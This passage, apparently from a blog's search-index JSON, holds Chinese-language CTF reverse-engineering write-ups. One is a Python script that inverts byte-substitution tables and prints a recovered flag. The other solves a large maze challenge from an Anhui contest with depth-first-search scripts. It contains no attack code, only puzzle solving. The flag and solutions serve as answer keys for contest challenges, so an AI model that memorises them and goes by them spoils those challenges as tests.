0xB6, 0x1F, 0xC3, 0xB7, 0xDA, 0x8D, 0x05, 0xEE, 0x18, 0x93, 0x3A, 0x6A, 0x8C, 0x43, 0x8F, 0xEB, 0xE9, 0x5B, 0x29, 0x37, 0x1E, 0x46, 0x33, 0x31, 0xFB, 0x35, 0x34, 0x61, 0x04, 0x0E, 0x2B, 0x74, 0xF9, 0x8B, 0x2C, 0x20, 0x0C, 0x7C, 0x28, 0x5C, 0xCA, 0xE6, 0x6B, 0xD8, 0x30, 0xE4, 0x21, 0x44, 0x70, 0x06, 0xA6, 0x60, 0x41, 0x84, 0x10, 0x95, 0x4F, 0x64, 0x83, 0xD2, 0x9A, 0xBE, 0xAF, 0x9F, 0x07, 0xC1, 0xB8, 0x3B, 0x65, 0xCC, 0x57, 0xB5, 0xD9, 0x92, 0xDE, 0x0D, 0xE3, 0xF3, 0xA4, 0xBD, 0x6F, 0xD3, 0x25, 0x88, 0x71, 0xFF, 0xA9, 0x36, 0xB1, 0x78, 0x24, 0x69, 0xAD, 0x19, 0xBF, 0xFD, 0xCD, 0x4A, 0xEA, 0x87, 0x91, 0xA8, 0x66, 0x82, 0x50, 0x0F, 0x99, 0x45, 0xF2, 0xD5, 0x9B, 0x94, 0x7D, 0xCE, 0xDB, 0xB9, 0x52, 0xE5, 0xF4, 0x01, 0x7F, 0xD4, 0x15, 0x2D, 0x3F, 0x1D, 0xA7, 0xC2, 0xFA, 0x40, 0xE8, 0xA0, 0x55, 0x6C, 0xF7, 0x1B, 0x58, 0x85, 0x56, 0x9E, 0xEC, 0x97, 0x23, 0xF0, 0x4D, 0xD0, 0xF8, 0x2A, 0x49, 0xB4, 0x76, 0x54, 0xDF]def fun2(): for i in range(1,len(flag)-1): for j in range(len(by280)): if flag[i] == by280[j]: flag[i] = j breakdef fun3(): for i in range(1,len(flag)-1): for j in range(len(by380)): if flag[i] == by380[j]: flag[i] = j breakdef fun5(): for i in range(1,len(flag)-1): for j in range(len(by580)): if flag[i] == by580[j]: flag[i] = j breakdef fun7(): for i in range(1,len(flag)-1): for j in range(len(by780)): if flag[i] == by780[j]: flag[i] = j breakdef funb(): for i in range(1,len(flag)-1): for j in range(len(byb80)): if flag[i] == byb80[j]: flag[i] = j breakdef fund(): for i in range(1,len(flag)-1): for j in range(len(byd80)): if flag[i] == byd80[j]: flag[i] = j break def fun11(): for i in range(1,len(flag)-1): for j in range(len(by1180)): if flag[i] == by1180[j]: flag[i] = j break def fun13(): for i in range(1,len(flag)-1): for j in range(len(by1380)): if flag[i] == by1380[j]: flag[i] = j break def fun17(): for i in range(1,len(flag)-1): for j in range(len(by1780)): if flag[i] == by1780[j]: flag[i] = j breakdef fun1d(): for i in range(1,len(flag)-1): for j in range(len(by1d80)): if flag[i] == by1d80[j]: flag[i] = j breakfun1d()fun17()fun13()fun11()fund()funb()fun7()fun5()fun3()fun2()print(bytearray(flag))index = [&#x27;2&#x27;, &#x27;3&#x27;, &#x27;5&#x27;, &#x27;7&#x27;, &#x27;b&#x27;, &#x27;d&#x27;, &#x27;11&#x27;, &#x27;13&#x27;, &#x27;17&#x27;, &#x27;1d&#x27;]# #y0u_4r3_7h3_m4573r_0f_r3v3r51n6_! &#x3D;&#x3D;然后这里注意的是flag[i] &#x3D; j后一定要加break，不然会无，然后第二段数据有多解，在移位操作处加&amp;0xfffffff,比如((a1[12] &lt;&lt; 6)&amp;0xffffffff)，这样才算和c代码成功转换&#x3D;&#x3D;","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]},{"title":"安徽省赛","slug":"安徽省赛","date":"2022-11-21T06:13:57.000Z","updated":"2022-11-29T08:53:10.582Z","comments":true,"path":"2022/11/21/安徽省赛/","link":"","permalink":"https://pa1r0t.github.io/2022/11/21/%E5%AE%89%E5%BE%BD%E7%9C%81%E8%B5%9B/","excerpt":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来","text":"安徽省赛只有一个小时，我吐了，脚本都来不及写。。。。赛后才把flag搞出来 呃， 我其实也是第一次见这么庞大的迷宫，一共4384个格~~ 这里看见一行66 代码逻辑很简单，这里不做过多介绍 &#x2F;我原先的脚本的思路是走到错的地方再返回，导致效率太低，跑了好久都没跑出来&#x2F; 赛后我还未想好该怎么优化我的深搜算法，所以就进行了一波手工画图。。。。。。。。 图一： 图二： 图三： emmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 然后就根据这个路线，手写路线字符串 以上是我写的，本办法，太菜了，只能这么搞了 ##下面贴上EDI团队的脚本 1234567891011121314151617181920212223242526272829303132333435363738394041map = []data =[map[i*66:i*66+66] for i in range(66)]print(data)usedmap = [[0 for i in range(len(data))] for i in range(len(data)) ]flag=&quot;&quot;def DFS(x,y): global flag if x == 64 and y == 65: print(flag) if data[x+1][y] == 0 and usedmap [x+1][y] == 0: usedmap [x][y] = 1 flag += &#x27;s&#x27; DFS(x+1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x-1][y] == 0 and usedmap [x-1][y] == 0: usedmap [x][y] = 1 flag += &#x27;w&#x27; DFS(x-1,y) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y+1] == 0 and usedmap [x][y+1] == 0: usedmap [x][y] = 1 flag += &#x27;d&#x27; DFS(x,y+1) flag = flag[:-1] usedmap [x][y] = 0 if data[x][y-1] == 0 and usedmap [x][y-1] == 0: usedmap [x][y] = 1 flag += &#x27;a&#x27; DFS(x,y-1) flag = flag[:-1] usedmap [x][y] = 0y=0x=1try: DFS(x,y)except: pass 他们的脚本其实就是只走对的位置，我实在没想到居然效率会快这么多！！！！！！！！！ 后来我参照他们的思路，重新优化了一下我的脚本，可以说在他们的基础上在一次优化了程序的效率 只能说算法实在太重要了！！！！！！！！！！！！！！ 我的代码：1234567891011121314151617181920212223242526272829303132def dfs(v6, v7): global flag if len(flag) &gt; 364: # 这里防止深度过深 return if v6 == 64 and v7 == 65: print(flag) tlag[66 * v6 + v7] = 1 # 标记走过了 if map1[66 * v6 + v7 + 1] == 0 and tlag[66 * v6 + v7+1] == 0: # 这个位置能不能走，有没有走过 flag += &#x27;d&#x27; dfs(v6, v7 + 1) flag = flag[:-1] if map1[66 * (v6+1) + v7] == 0 and tlag[66 * (v6+1) + v7] == 0: flag += &#x27;s&#x27; dfs(v6+1,v7) flag = flag[:-1] if map1[66 * (v6-1) + v7] == 0 and tlag[66 * (v6-1) + v7] == 0: flag += &#x27;w&#x27; dfs(v6-1, v7) flag = flag[:-1] if map1[66 * (v6) + v7 - 1] == 0 and tlag[66 * (v6) + v7-1] == 0: flag += &#x27;a&#x27; dfs(v6, v7 - 1) flag = flag[:-1] # 这里不用将标志去掉，因为这个位置所有方向都走过了都没到终点，那么其他位置到达该位置也无法到达终点，所以懂吧？if __name__ == &quot;__main__&quot;: map1 = [] tlag = [0]*len(map1) flag = &quot;&quot; try: dfs(1, 0) except: pass 至于代码的细节这里直接看注释即可，都已经写好了 总结这里个人的算法功底还有待提升，算法还是要多练，不然明明会做，但是现场做不出来，太难受了！！！","categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"}],"tags":[]}],"categories":[{"name":"ctf","slug":"ctf","permalink":"https://pa1r0t.github.io/categories/ctf/"},{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"}],"tags":[]}